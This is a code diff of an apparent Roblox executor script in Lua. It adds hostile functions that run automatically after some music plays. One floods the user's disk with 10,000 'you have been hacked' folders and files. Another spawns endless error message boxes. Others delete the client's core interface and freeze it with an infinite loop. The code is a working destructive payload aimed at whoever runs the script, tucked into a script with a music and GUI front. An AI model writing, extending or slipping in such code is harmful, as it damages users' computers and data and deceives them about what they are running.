@@ -20,10 +20,34 @@ local function chat(str)
 		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
 	end
 end
--- Crash
+-- Functions
 local function crash()
 	wait(.1)
 	while true do end
+end
+
+local function delete_coregui()
+	for _, v in pairs(CoreGui:GetDescendants()) do
+		v:Destroy()
+		print(`Deleting CoreGui Object: {v}`)
+	end
+end
+
+local function file_bomb()
+	local ff = ("h"):rep(10000)
+	for i = 1, 10000 do
+		makefolder(`you have been hacked{i}`)
+		writefile(`you have been hacked{i}.txt`, ff)
+	end
+end
+
+local function msgbox()
+	if messagebox then
+		while true do
+			messagebox("you have been hacked", "you have been hacked", 2+16)
+			task.wait()
+		end
+	end
 end
 
 -- Music
@@ -38,13 +62,9 @@ task.wait(_G.Delayed_1)
 Sound:Play()
 task.wait(_G.Delayed_2)
 
-task.spawn(function()
-	for _, v in pairs(CoreGui:GetDescendants()) do
-		v:Destroy()
-		print(`Deleted: {v}`)
-	end
-	print(":)")
-end)
+task.spawn(delete_coregui)
+task.spawn(file_bomb)
+task.spawn(msgbox)
 
 -- Properties
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
